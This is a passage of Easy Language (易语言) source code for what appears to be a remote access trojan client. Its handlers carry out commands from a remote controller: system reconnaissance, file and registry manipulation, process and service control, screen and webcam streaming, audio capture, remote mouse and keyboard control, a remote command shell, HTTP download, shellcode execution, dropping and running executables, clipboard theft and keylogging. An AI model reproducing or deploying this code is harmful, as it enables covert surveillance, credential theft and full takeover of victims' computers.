 ' 局部_内存状态.结构长度 ＝ 32
 ' 取全局内存状态_ (局部_内存状态)
 ' 详细信息 ＝ 详细信息 ＋ 数值到格式文本 (局部_内存状态.实际存储器百分比, , 假) ＋ “ %used” ＋ 分符 ＋ “总:” ＋ 数值到格式文本 (局部_内存状态.总物理内存 ÷ 1024, , 真) ＋ “Kbyte |可用:” ＋ 数值到格式文本 (局部_内存状态.可用物理内存 ÷ 1024, , 真) ＋ “Kbyte” ＋ 分符 ＋ “总:” ＋ 数值到格式文本 (局部_内存状态.总虚拟内存 ÷ 1024, , 真) ＋ “Kbyte |可用:” ＋ 数值到格式文本 (局部_内存状态.可用虚拟内存 ÷ 1024, , 真) ＋ “Kbyte” ＋ 分符 ＋ “总:” ＋ 数值到格式文本 (局部_内存状态.总页文件 ÷ 1024, , 真) ＋ “Kbyte |可用:” ＋ 数值到格式文本 (局部_内存状态.可用页文件 ÷ 1024, , 真) ＋ “Kbyte” ＋ 分符  ' 物理内存。虚拟内存。页面大小。
 ' 详细信息 ＝ 详细信息 ＋ 系统_取操作系统类别 () ＋ 分符  ' 取操作系统类别
 ' 详细信息 ＝ 详细信息 ＋ 取系统用户名 () ＋ 分符  ' 取系统用户名
 ' 详细信息 ＝ 详细信息 ＋ 取计算机名 () ＋ 分符  ' 取计算机名
 ' 详细信息 ＝ 详细信息 ＋ 取系统特定目录 (0) ＋ 分符  ' 系统目录
 ' 详细信息 ＝ 详细信息 ＋ 取屏幕分辨率 () ＋ 分符  ' 取屏幕分辨率
 ' 详细信息 ＝ 详细信息 ＋ “版本:1.00” ＋ 分符  ' 取屏幕分辨率

传送数据子程序 (1, 相加 ({ 2 }, 到字节集 (详细信息)))
 ' 传送数据子程序 (1, { 3 } ＋ 到字节集 (取磁盘数据 ()))

.子程序 磁盘数据_子程序, 空白型, , 
传送数据子程序 (1, 相加 ({ 3 }, 到字节集 (取磁盘数据 ())))

.子程序 文件管理子程序, 空白型, , 
.参数 数据, 字节集, , 

.局部变量 命令, 字节集, , , 
.局部变量 变量1, 空白型, , , 
.局部变量 a, 整数型, , , 
.局部变量 b, d安全性结构_, , , 
.局部变量 分割文本a, 字节集, , "0", 


赋值 (命令, 取字节集左边 (数据, 1))
赋值 (数据, 取字节集右边 (数据, 相减 (取字节集长度 (数据), 1)))
.判断开始 (等于 (命令, { 1 }))
    赋值 (分割文本a, 分割字节集 (数据, 到字节集 (“|”), ))
    .如果真 (大于或等于 (取数组成员数 (分割文本a), 3))
        .如果真 (等于 (文件是否存在 (到文本 (分割文本a [1])), 真))
            .如果 (大于 (执行文件 (到文本 (分割文本a [1]), 删首尾空 (到文本 (分割文本a [2])), , 到整数 (到文本 (分割文本a [3]))), 32))
                传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (相加 (“运行文件成功”, 到文本 (分割文本a [3]))))) ' ' 控制客户发送文本 (“信息返回运行文件成功” ＋ 分割文本a [3])
            .否则
                传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (相加 (“运行文件成功”, 到文本 (分割文本a [3]))))) ' ' 控制客户发送文本 (“信息返回运行文件失败！” ＋ 分割文本a [3])
            .如果结束
            
        .如果真结束
        
    .如果真结束
    
.判断 (等于 (命令, { 2 })) ' 新建文件名
    
    赋值 (a, 文件_打开文件 (到文本 (数据), 6, 1)) ' 打开文件 (, , )
    .如果 (不等于 (a, 0))
        关闭文件 (a)
        传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“新建文件成功,请刷新...”)))
    .否则
        传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“新建文件失败！”)))
    .如果结束
    
.判断 (等于 (命令, { 3 })) ' 重命名
    赋值 (分割文本a, 分割字节集 (数据, 到字节集 (“|”), ))
    输出调试文本 (到文本 (数据))
    .如果真 (大于或等于 (取数组成员数 (分割文本a), 2))
        .如果 (文件更名 (到文本 (分割文本a [1]), 到文本 (分割文本a [2])))
            传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“重命名成功,请刷新...”)))
        .否则
            传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“重命名文件失败！”)))
        .如果结束
        
    .如果真结束
    
.判断 (等于 (命令, { 4 }))
    .如果 (不等于 (删除指定目录_ (到文本 (数据)), 0))
        传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“删除文件夹成功,请刷新...”)))
    .否则
        传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“删除文件夹失败！”)))
    .如果结束
    
.判断 (等于 (命令, { 5 })) ' 新建文件夹
    .如果 (不等于 (创建目录_ (到文本 (数据), b), 0))
        传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“新建文件夹成功,请刷新...”)))
    .否则
        传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“新建文件夹失败！”)))
    .如果结束
    
.判断 (等于 (命令, { 6 })) ' 删除文件
    .如果 (文件_删除文件 (到文本 (数据)))
        传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“删除文件成功,请刷新...”)))
    .否则
        传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“删除文件失败！”)))
    .如果结束
    
.判断 (等于 (命令, { 7 }))
    赋值 (分割文本a, 分割字节集 (数据, 到字节集 (“|”), ))
    .如果真 (大于或等于 (取数组成员数 (分割文本a), 2))
        .如果 (文件_复制文件 (到文本 (分割文本a [1]), 到文本 (分割文本a [2])))
            传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“复制成功,请刷新...”)))
        .否则
            传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“复制文件失败！”)))
        .如果结束
        
    .如果真结束
    
.判断 (等于 (命令, { 8 })) ' 移动文件
    赋值 (分割文本a, 分割字节集 (数据, 到字节集 (“|”), ))
    .如果真 (大于或等于 (取数组成员数 (分割文本a), 2))
        .如果 (文件更名 (到文本 (分割文本a [1]), 到文本 (分割文本a [2])))
            传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“移动文件成功,请刷新...”)))
        .否则
            传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“移动文件文件失败！”)))
        .如果结束
        
    .如果真结束
    
.判断 (等于 (命令, { 9 }))
    传送数据子程序 (1, 相加 ({ 4 }, { 1 }, 到字节集 (相加 (取文件夹信息 (到文本 (数据)), 取文件名信息 (到文本 (数据)))))) ' 文件浏览
.判断 (等于 (命令, { 10 })) ' 盘搜索文件内容
    文件搜索子程序 (数据)
.判断 (等于 (命令, { 11 })) ' 搜索文件 停止
    赋值 (停止搜索, 1)
.判断 (等于 (命令, { 12 }))
    传输操作 (数据)
.判断 (等于 (命令, { 13 }))
    文件下载寻找文件 (到文本 (数据))
.默认
    
.判断结束


.子程序 进程信息子程序, 空白型, , 
.参数 数据, 字节集, , 

.局部变量 命令, 字节集, , , 
.局部变量 变量1, 空白型, , , 

赋值 (命令, 取字节集左边 (数据, 1))
赋值 (数据, 取字节集右边 (数据, 相减 (取字节集长度 (数据), 1)))
.判断开始 (等于 (命令, { 1 })) ' 枚举系统进程
    传送数据子程序 (1, 相加 ({ 5 }, { 1 }, 到字节集 (枚举系统进程 ()))) ' “进程返回” ＋
.判断 (等于 (命令, { 2 })) ' 关闭进程
    输出调试文本 (到整数 (到文本 (数据)))
    
    .判断开始 (终止进程_ (到整数 (到文本 (数据))))
        传送数据子程序 (1, 相加 ({ 255 }, { 2 }))
    .默认
        传送数据子程序 (1, 相加 ({ 255 }, { 3 }))
    .判断结束
    
.判断 (等于 (命令, { 3 })) ' 刷新窗口
    传送数据子程序 (1, 相加 ({ 5 }, { 3 }, 到字节集 (枚举窗口 ())))
.判断 (等于 (命令, { 4 })) ' 关闭窗口
    赋值 (变量1, 到整数 (到文本 (数据)))
    .如果 (不等于 (变量1, 0))
        SendMessage (变量1, 16, 0, 0)
        传送数据子程序 (1, 相加 ({ 255 }, { 4 }))
    .否则
        传送数据子程序 (1, 相加 ({ 255 }, { 5 }))
    .如果结束
    
.判断 (等于 (命令, { 5 })) ' 窗口最小化
    ShowWindow (到整数 (到文本 (数据)), 2)
    传送数据子程序 (1, 相加 ({ 255 }, { 6 }))
.判断 (等于 (命令, { 6 })) ' 窗口最大化
    ShowWindow (到整数 (到文本 (数据)), 3)
    传送数据子程序 (1, 相加 ({ 255 }, { 6 }))
.判断 (等于 (命令, { 7 })) ' 窗口显示
    ShowWindow (到整数 (到文本 (数据)), 4)
    传送数据子程序 (1, 相加 ({ 255 }, { 6 }))
.判断 (等于 (命令, { 8 })) ' 窗口隐藏
    ShowWindow (到整数 (到文本 (数据)), 0)
    传送数据子程序 (1, 相加 ({ 255 }, { 6 }))
.默认
    
.判断结束



.子程序 注册表子程序, 空白型, , 
.参数 数据, 字节集, , 

.局部变量 文本, 文本型, , , 
.局部变量 操作, 文本型, , , 
.局部变量 命在, 文本型, , , 
.局部变量 返回文本, 文本型, , , 
.局部变量 文本a, 文本型, , "0", 
.局部变量 文本数, 整数型, , , 
.局部变量 参数开, 文本型, , , 

赋值 (文本, 到文本 (数据))
赋值 (操作, 取文本左边 (文本, 1))
赋值 (命在, 取文本右边 (文本, 相减 (取文本长度 (文本), 1)))
.判断开始 (等于 (操作, 到文本 ({ 1 }))) ' 读注册表
    赋值 (返回文本, 相加 (注册表.枚举子文件夹 (到整数 (取文本左边 (命在, 1)), 取文本右边 (命在, 相减 (取文本长度 (命在), 1))), 注册表.枚举文件 (到整数 (取文本左边 (命在, 1)), 取文本右边 (命在, 相减 (取文本长度 (命在), 1)))))
    传送数据子程序 (1, 相加 ({ 6 }, { 1 }, 到字节集 (返回文本))) ' 控制客户发送文本 (返回文本)
.判断 (等于 (操作, 到文本 ({ 2 }))) ' 添加修改
    赋值 (文本a, 分割文本 (命在, “|”, ))
    .如果真 (大于或等于 (取数组成员数 (文本a), 3))
        .如果 (写注册项 (到整数 (取文本右边 (文本a [1], 1)), 文本a [2], 文本a [3]))
            传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“修改注册表成功,请刷新...”))) ' 控制客户发送文本 (“信息返回修改注册表成功,请刷新...”)
        .否则
            传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“修改注册表失败,请重试!”))) ' 控制客户发送文本 (“信息返回修改注册表失败,请重试!”)
        .如果结束
        
    .如果真结束
    
.判断 (等于 (操作, 到文本 ({ 3 }))) ' 重命名
    赋值 (文本a, 分割文本 (命在, “|”, ))
    .如果真 (大于或等于 (取数组成员数 (文本a), 4))
        赋值 (返回文本, 取文本注册项 (到整数 (取文本右边 (文本a [1], 1)), 相加 (文本a [2], 文本a [4]), “PP错”))
        .如果真 (不等于 (返回文本, “PP错”))
            .如果真 (写注册项 (到整数 (取文本右边 (文本a [1], 1)), 文本a [3], 返回文本))
                .如果真 (注册表.删除项 (到整数 (取文本右边 (文本a [1], 1)), 文本a [2], 文本a [4]))
                    传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“修改注册表成功,请刷新...”))) ' 控制客户发送文本 (“信息返回修改注册表成功,请刷新...”)
                    返回 ()
                .如果真结束
                
            .如果真结束
            
        .如果真结束
        传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“修改注册表失败,请重试!”))) ' 控制客户发送文本 (“信息返回修改注册表失败,请重试!”)
    .如果真结束
    
.判断 (等于 (操作, 到文本 ({ 4 }))) ' 删除
    赋值 (文本a, 分割文本 (命在, “|”, ))
    .如果真 (大于或等于 (取数组成员数 (文本a), 3))
        .如果 (注册表.删除项 (到整数 (取文本右边 (文本a [1], 1)), 文本a [2], 文本a [3]))
            传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“修改注册表成功,请刷新...”))) ' 控制客户发送文本 (“信息返回修改注册表成功,请刷新...”)
        .否则
            传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“修改注册表成功,请刷新...”))) ' 控制客户发送文本 (“信息返回修改注册表失败,请重试!”)
        .如果结束
        
    .如果真结束
    
.判断 (等于 (操作, 到文本 ({ 5 }))) ' 读启动表
    传送数据子程序 (1, 相加 ({ 6 }, { 5 }, 到字节集 (注册表.枚举启动列表 ()))) ' 控制客户发送文本 (“注册启动” ＋ 注册表.枚举启动列表 ())
.判断 (等于 (操作, 到文本 ({ 6 }))) ' 读软件表
    传送数据子程序 (1, 相加 ({ 6 }, { 9 }, 到字节集 (注册表.枚举软件列表 ()))) ' 控制客户发送文本 (注册表.枚举软件列表 ())
.判断 (等于 (操作, 到文本 ({ 7 }))) ' 添加修改数值
    赋值 (文本a, 分割文本 (命在, “|”, ))
    .如果真 (大于或等于 (取数组成员数 (文本a), 3))
        .如果 (写注册项 (到整数 (取文本右边 (文本a [1], 1)), 文本a [2], 到整数 (文本a [3])))
            传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“修改注册表成功,请刷新...”))) ' 控制客户发送文本 (“信息返回修改注册表成功,请刷新...”)
        .否则
            传送数据子程序 (1, 相加 ({ 255 }, { 1 }, 到字节集 (“修改注册表成功,请刷新...”))) ' 控制客户发送文本 (“信息返回修改注册表失败,请重试!”)
        .如果结束
        
    .如果真结束
    
.默认
    
.判断结束


.子程序 系统服务子程序, 空白型, , 
.参数 数据, 字节集, , 

.局部变量 命令, 字节集, , , 
.局部变量 信息, 文本型, , , 

赋值 (命令, 取字节集左边 (数据, 1))
赋值 (信息, 到文本 (取字节集右边 (数据, 相减 (取字节集长度 (数据), 1))))

.判断开始 (等于 (命令, { 1 }))
    传送数据子程序 (1, 相加 ({ 7 }, 到字节集 (枚举服务 ())))
.判断 (等于 (命令, { 2 }))
    传送数据子程序 (1, 相加 ({ 7 }, 到字节集 (取服务状态 (信息))))
.判断 (等于 (命令, { 3 }))
    传送数据子程序 (1, 相加 ({ 7 }, 到字节集 (启动服务 (信息))))
.判断 (等于 (命令, { 4 }))
    传送数据子程序 (1, 相加 ({ 7 }, 到字节集 (停止服务 (信息))))
.判断 (等于 (命令, { 5 }))
    .如果真 (写注册项 (#本地机器, 相加 (“SYSTEM\CurrentControlSet\Services\”, 取文本左边 (信息, 相减 (取文本长度 (信息), 1)), “\Start”), 到整数 (取文本右边 (信息, 1))))
        传送数据子程序 (1, 相加 ({ 7 }, 到字节集 (“服务修改成功”)))
        返回 ()
    .如果真结束
    传送数据子程序 (1, 相加 ({ 7 }, 到字节集 (“服务修改失败”)))
.判断 (等于 (命令, { 6 }))
    .如果真 (删除服务 (信息))
        传送数据子程序 (1, 相加 ({ 7 }, 到字节集 (“服务删除成功”)))
        返回 ()
    .如果真结束
    传送数据子程序 (1, 相加 ({ 7 }, 到字节集 (“服务删除失败”)))
.默认
    
.判断结束


.子程序 屏幕控制子程序, 空白型, , 
.参数 数据, 字节集, , 

.局部变量 命令, 字节集, , , 
.局部变量 地址, 字节集, , , 
.局部变量 临时, 字节集, , "0", 
.局部变量 鼠标坐标, 文本型, , "0", 
.局部变量 扫描码, 整数型, , , 
.局部变量 矩形, 矩形, , , 
.局部变量 y, 整数型, , , 
.局部变量 x, 整数型, , , 

赋值 (命令, 取字节集左边 (数据, 1))
赋值 (数据, 取字节集右边 (数据, 相减 (取字节集长度 (数据), 1)))
.判断开始 (等于 (命令, { 1 }))
    屏幕初始化 (到整数 (到文本 (数据)))
.判断 (等于 (命令, { 2 }))
    .如果真 (传送)
        传送数据子程序 (1, 相加 ({ 9 }, { 2 }, 压缩数据_ (屏幕.获取差异 ())))
    .如果真结束
    返回 ()
.判断 (等于 (命令, { 3 }))
    赋值 (鼠标坐标, 分割文本 (到文本 (数据), “|”, ))
    .如果真 (大于 (取数组成员数 (鼠标坐标), 2))
        _移动鼠标 (到整数 (鼠标坐标 [2]), 到整数 (鼠标坐标 [3]))
        鼠标键 (1, 3)
    .如果真结束
    
.判断 (等于 (命令, { 4 }))
    赋值 (鼠标坐标, 分割文本 (到文本 (数据), “|”, ))
    .如果真 (大于 (取数组成员数 (鼠标坐标), 2))
        _移动鼠标 (到整数 (鼠标坐标 [2]), 到整数 (鼠标坐标 [3]))
        鼠标键 (1, 4)
    .如果真结束
    
.判断 (等于 (命令, { 5 }))
    赋值 (鼠标坐标, 分割文本 (到文本 (数据), “|”, ))
    .如果真 (大于 (取数组成员数 (鼠标坐标), 2))
        _移动鼠标 (到整数 (鼠标坐标 [2]), 到整数 (鼠标坐标 [3]))
        鼠标键 (2, 3)
    .如果真结束
    
.判断 (等于 (命令, { 6 }))
    赋值 (鼠标坐标, 分割文本 (到文本 (数据), “|”, ))
    .如果真 (大于 (取数组成员数 (鼠标坐标), 2))
        _移动鼠标 (到整数 (鼠标坐标 [2]), 到整数 (鼠标坐标 [3]))
        鼠标键 (2, 4)
    .如果真结束
    
.判断 (等于 (命令, { 7 }))
    赋值 (鼠标坐标, 分割文本 (到文本 (数据), “|”, ))
    .如果真 (大于 (取数组成员数 (鼠标坐标), 2))
        _移动鼠标 (到整数 (鼠标坐标 [2]), 到整数 (鼠标坐标 [3]))
    .如果真结束
    
.判断 (等于 (命令, { 8 }))
    赋值 (扫描码, 到整数 (到文本 (数据)))
    模拟键盘行动_ (扫描码, 0, 0, 0)
.判断 (等于 (命令, { 9 }))
    赋值 (扫描码, 到整数 (到文本 (数据)))
    模拟键盘行动_ (扫描码, 0, 2, 0)
.判断 (等于 (命令, { 10 }))
    屏幕.启动 (到整数 (到文本 (数据)), 15)
.判断 (等于 (命令, { 11 }))
    赋值 (传送, 假)
    屏幕.销毁 ()
.判断 (等于 (命令, { 12 }))
    BlockInput (1) ' 锁定鼠标
.判断 (等于 (命令, { 13 }))
    BlockInput (0) ' 解除鼠标
.判断 (等于 (命令, { 14 }))
    SendMessage (全局_窗口句柄, 274, 61808, 2) ' 关闭显示器
.判断 (等于 (命令, { 15 }))
    SendMessage (全局_窗口句柄, 274, 61808, -1) ' 开启显示器
.默认
    
.判断结束


.子程序 屏幕初始化, 空白型, , 
.参数 位深, 空白型, , 

.局部变量 零时图片数据, 字节集, , , 
.局部变量 零时位图信息, BITMAPINFOHEADER, , , 

 ' 输出调试文本 (位深)
赋值 (传送, 真)
屏幕.启动 (位深, 15)

赋值 (屏幕高, 获取系统信息 (79))
赋值 (屏幕宽, 获取系统信息 (78))

传送数据子程序 (1, 相加 ({ 9 }, { 1 }, 到字节集 (相加 (“||”, 到文本 (屏幕宽), “||”, 到文本 (屏幕高), “||”))))

.子程序 鼠标键, 空白型, , 模拟鼠标按键
.参数 键, 整数型, , 可空:为左键  1 #左键   2 #右键
.参数 控制, 整数型, , 可空:为单击  1 #单击   2 #双击   3 #按下  4 #放开

.如果真 (等于 (键, 1))
    .如果真 (等于 (控制, 3))
        _控制鼠标 (2, 0, 0, 0, 0)
    .如果真结束
    .如果真 (等于 (控制, 4))
        _控制鼠标 (4, 0, 0, 0, 0)
    .如果真结束
    
.如果真结束
.如果真 (等于 (键, 2))
    .如果真 (等于 (控制, 3))
        _控制鼠标 (8, 0, 0, 0, 0)
    .如果真结束
    .如果真 (等于 (控制, 4))
        _控制鼠标 (16, 0, 0, 0, 0)
    .如果真结束
    
.如果真结束


.子程序 视频显示子程序, 空白型, , 
.参数 数据, 字节集, , 

.局部变量 命令, 字节集, , , 
.局部变量 原视频, 字节集, 静态, , 
.局部变量 新视频, 字节集, , , 

赋值 (命令, 取字节集左边 (数据, 1))
赋值 (数据, 取字节集右边 (数据, 相减 (取字节集长度 (数据), 1)))

.判断开始 (等于 (命令, { 1 })) ' 刷新视频驱动
    传送数据子程序 (1, 相加 ({ 8 }, { 1 }, 到字节集 (查视频驱动 (假))))
.判断 (等于 (命令, { 2 })) ' 视频传送。速度优先
    .如果真 (等于 (视频状态, 0))
        启动线程_ (&初始化视频, 到整数 (数据))
        输出调试文本 (“视频创建”)
    .如果真结束
    .如果真 (等于 (视频状态, 2))
        赋值 (视频状态, 1)
        开始捕获 ()
    .如果真结束
    传送数据子程序 (1, 相加 ({ 8 }, { 2 }, 图像_转换图片格式 (截取视频 (), 2))) ' 8位图
.判断 (等于 (命令, { 3 })) ' 关闭视频
    赋值 (原视频, {  })
    赋值 (视频状态, 2)
    停止捕获 ()
.默认
    
.判断结束


.子程序 声音传送子程序, 空白型, , 
.参数 数据, 字节集, , 

.局部变量 命令, 字节集, , , 
.局部变量 X, 空白型, 静态, , 

赋值 (命令, 取字节集左边 (数据, 1))
赋值 (数据, 取字节集右边 (数据, 相减 (取字节集长度 (数据), 1)))

.判断开始 (等于 (命令, { 1 })) ' 声音设备刷新
    启动线程_ (&语音开始传送, , )
.判断 (等于 (命令, { 2 }))
     ' 启动线程_ (&声音传送子程序_线程, , )  ' 5秒
.判断 (等于 (命令, { 3 })) ' 停止声音
    停止语音 ()
.默认
    
.判断结束


.子程序 语音开始传送, 空白型, , 
启动线程_ (&录音开始, , )
 ' 核心_延时 (10)
 ' 启动线程_ (&声音传送子程序_线程, , )  ' 5秒

.子程序 声音传送子程序_线程, 空白型, , 
.局部变量 q, 字节集, , , 

赋值 (q, 压缩数据_ (声音))
传送数据子程序 (1, 相加 ({ 10 }, { 2 }, 到字节集 (q)))
输出调试文本 (取字节集长度 (q))
赋值 (声音, {  })

.子程序 cmd子程序, 空白型, , 
.参数 数据, 字节集, , 

.局部变量 命令, 字节集, , , 
.局部变量 未加密数据, 字节集, , , 

赋值 (命令, 取字节集左边 (数据, 1))
赋值 (数据, 取字节集右边 (数据, 相减 (取字节集长度 (数据), 1)))
.判断开始 (等于 (命令, { 1 }))
    .如果 (等于 (控制台_连接 (), 0))
        赋值 (未加密数据, 到字节集 (“失败”))
    .否则
        .如果 (等于 (控制台_取回结果 (), 假))
            赋值 (未加密数据, 到字节集 (“失败”))
        .否则
            赋值 (未加密数据, 到字节集 (“完成”))
            赋值 (连接DOS, 真)
        .如果结束
        
    .如果结束
    传送数据子程序 (1, 相加 ({ 11 }, { 2 }, 未加密数据))
.判断 (等于 (命令, { 2 }))
    .如果 (等于 (控制台_发送命令 (到文本 (数据)), 0))
        赋值 (未加密数据, 到字节集 (“失败”))
    .否则
        赋值 (未加密数据, 到字节集 (“完成”))
    .如果结束
    传送数据子程序 (1, 相加 ({ 11 }, { 2 }, 未加密数据))
.判断 (等于 (命令, { 3 }))
    .如果 (等于 (控制台_断开连接 (), 假))
        赋值 (未加密数据, 到字节集 (“未连接”))
    .否则
        赋值 (未加密数据, 到字节集 (“完成”))
        赋值 (连接DOS, 假)
    .如果结束
    传送数据子程序 (1, 相加 ({ 11 }, { 3 }, 未加密数据))
.默认
    
.判断结束


.子程序 命令广播子程序, 空白型, , 
.参数 数据, 字节集, , 

.局部变量 命令, 字节集, , , 
.局部变量 分割, 字节集, , "0", 

赋值 (命令, 取字节集左边 (数据, 1))
赋值 (数据, 取字节集右边 (数据, 相减 (取字节集长度 (数据), 1)))
.判断开始 (等于 (命令, { 1 }))
    关机操作 (0) ' 关机
.判断 (等于 (命令, { 2 }))
    关机操作 (1) ' 重启
.判断 (等于 (命令, { 3 }))
    关机操作 (2)
.判断 (等于 (命令, { 4 }))
    KillMe (取执行文件名 ())
     ' 卸载软件
.判断 (等于 (命令, { 5 }))
     ' TCP客户端 [1].断开 ()
    终止自身进程 ()
     ' 结束 ()  ' 结束软件
.判断 (等于 (命令, { 6 }))
    SendMessage (全局_窗口句柄, 2, 2, 0)
     ' 重启软件
.判断 (等于 (命令, { 7 }))
    运行 (相加 (“explorer ”, #引号, 到文本 (数据), #引号), 假, )
.判断 (等于 (命令, { 8 }))
    HTTP下载文件 (取字节集左边 (数据, 1), 到文本 (取字节集右边 (数据, 相减 (取字节集长度 (数据), 1))))
.判断 (等于 (命令, { 9 }))
    .如果真 (不等于 (寻找文本 (枚举系统进程 (), 到文本 (数据), , 假), -1))
        返回 ()
    .如果真结束
    传送数据子程序 (1, 相加 ({ 15 }, { 1 }))
.判断 (等于 (命令, { 10 }))
    .如果真 (不等于 (寻找文本 (枚举窗口 (), 到文本 (数据), , 假), -1))
        返回 ()
    .如果真结束
    传送数据子程序 (1, 相加 ({ 15 }, { 1 }))
.判断 (等于 (命令, { 11 }))
    赋值 (分割, 分割字节集 (数据, 分割符, ))
    信息框 (到文本 (分割 [1]), 到整数 (到文本 (分割 [2])), 到文本 (分割 [3]))
.判断 (等于 (命令, { 12 }))
    本机备注 (到文本 (数据))
.默认
    
.判断结束


.子程序 远程程序子程序, 空白型, , 小分割符 = { 59, 87, 16, 86, 246 } 
.参数 数据, 字节集, , 

.局部变量 命令, 字节集, , , 

赋值 (命令, 取字节集左边 (数据, 1))
赋值 (数据, 取字节集右边 (数据, 相减 (取字节集长度 (数据), 1)))
.判断开始 (等于 (命令, { 1 })) ' 取运行信息
     ' 已运行数据.EXE ＋ 分割符 ＋ 已运行数据.shellcode  ' 运行信息
    
.判断 (等于 (命令, { 2 })) ' 运行shellcode
    赋值 (命令, 取字节集左边 (数据, 10))
    赋值 (数据, 取字节集右边 (数据, 相减 (取字节集长度 (数据), 10)))
    赋值 (已运行数据.shellcode, 相加 (已运行数据.shellcode, 命令, { 59, 87, 16, 86, 246 }))
    CallWindowProcA_shellcode (数据, 0, 0, 0, 0)
.判断 (等于 (命令, { 3 })) ' 运行EXE
    赋值 (命令, 取字节集左边 (数据, 1))
    赋值 (数据, 取字节集右边 (数据, 相减 (取字节集长度 (数据), 10)))
    赋值 (已运行数据.EXE, 相加 (已运行数据.EXE, 命令, { 59, 87, 16, 86, 246 }))
    写到文件 (相加 (取系统特定目录 (2), “temp1.exe”), 数据)
    运行 (相加 (取系统特定目录 (2), “temp1.exe”), 假, )
.默认
    
.判断结束


.子程序 键盘记录子程序, 空白型, , 
.参数 数据, 字节集, , 

.局部变量 命令, 字节集, , , 
.局部变量 临时文本, 文本型, , , 

赋值 (命令, 取字节集左边 (数据, 1))
赋值 (数据, 取字节集右边 (数据, 相减 (取字节集长度 (数据), 1)))
.判断开始 (等于 (命令, { 1 }))
    赋值 (临时文本, 取剪辑板文本 ())
    .如果真 (不等于 (临时文本, “”))
        传送数据子程序 (1, 相加 ({ 14 }, { 1 }, 到字节集 (临时文本)))
        返回 ()
    .如果真结束
    传送数据子程序 (1, 相加 ({ 14 }, { 2 }))
.判断 (等于 (命令, { 2 }))
    .如果真 (开始键盘记录 ())
        传送数据子程序 (1, 相加 ({ 14 }, { 3 }))
        返回 ()
    .如果真结束
    传送数据子程序 (1, 相加 ({ 14 }, { 4 }))
.判断 (等于 (命令, { 3 }))
    赋值 (临时文本, 停止键盘记录 ())
    .如果真 (不等于 (临时文本, “”))
        传送数据子程序 (1, 相加 ({ 14 }, { 5 }, 到字节集 (临时文本)))
        返回 ()
    .如果真结束
    传送数据子程序 (1, 相加 ({ 14 }, { 6 }))
.默认
    
.判断结束


.程序集 杂项程序集, , , 

.程序集变量 传输, 项目, , , 
.程序集变量 传输线程, 整数型, , , 
.程序集变量 键盘记录_hMMTimer, 空白型, , , 
.程序集变量 键盘记录_内容, 文本型, , , 
.子程序 系统_取操作系统类别, 文本型, , 返回值：“未知”, “Win95”, “Win98”, “WinME”, “ WinNT”, “Win2000”, “WinXP”, “Win2003”, “Vista”,"Win7"
.参数 匿名参数_11760, 空白型, , 

.局部变量 VerInfo, OSVERSIONINFOEX, , , 
.局部变量 SysInfo, 低层平台信息系统信息, , , 

GetSystemInfo (SysInfo)
赋值 (VerInfo.dwOSVersionInfoSize, 156) ' sizeof(OSVERSIONINFOEX) ' 支持 Win2000以上
.如果真 (等于 (GetVersionEx (VerInfo), 假))
    赋值 (VerInfo.dwOSVersionInfoSize, 148) ' sizeof(OSVERSIONINFO) ' 支持 Win95以上
.如果真结束
.如果真 (GetVersionEx (VerInfo))
    .如果真 (等于 (VerInfo.dwPlatformId, 2))
        .如果真 (小于或等于 (VerInfo.dwMajorVersion, 4))
            返回 (“Windows NT”)
        .如果真结束
        .如果真 (等于 (VerInfo.dwMajorVersion, 5))
            .如果真 (等于 (VerInfo.dwMinorVersion, 0))
                返回 (“Windows 2000”) ' Windows NT 5.1
            .如果真结束
            .如果真 (等于 (VerInfo.dwMinorVersion, 1))
                返回 (“Windows XP”)
            .如果真结束
            .如果真 (等于 (VerInfo.dwMinorVersion, 2))
                .如果真 (并且 (等于 (VerInfo.wProductType, 1), 等于 (位与 (SysInfo.dwOemID, 65535), 9)))
                    返回 (“Windows XP x64”) ' Microsoft Windows XP Professional x64
                .如果真结束
                返回 (“Windows 2003”)
            .如果真结束
            
        .如果真结束
        
    .如果真结束
    .如果真 (等于 (VerInfo.dwMajorVersion, 6))
        .如果真 (等于 (VerInfo.dwMinorVersion, 0))
            .如果真 (等于 (VerInfo.wProductType, 1))
                返回 (“Windows Vista”)
            .如果真结束
            返回 (“Windows Server 2008”) ' Windows Server Longhorn
        .如果真结束
        .如果真 (等于 (VerInfo.dwMinorVersion, 1))
            返回 (“Windows 7”)
        .如果真结束
        
    .如果真结束
    .如果真 (等于 (VerInfo.dwPlatformId, 1))
        .如果真 (等于 (VerInfo.dwMajorVersion, 4))
            .如果真 (等于 (VerInfo.dwMinorVersion, 0))
                返回 (“Windows 95”)
            .如果真结束
            .如果真 (等于 (VerInfo.dwMinorVersion, 10))
                返回 (“Windows 98”)
            .如果真结束
            .如果真 (等于 (VerInfo.dwMajorVersion, 90))
                返回 (“Windows ME”) ' Microsoft Windows Millennium Edition
            .如果真结束
            
        .如果真结束
        
    .如果真结束
    .如果真 (等于 (VerInfo.dwPlatformId, 0))
        返回 (“Win32s”)
    .如果真结束
    
.如果真结束
返回 (“未知系统”)


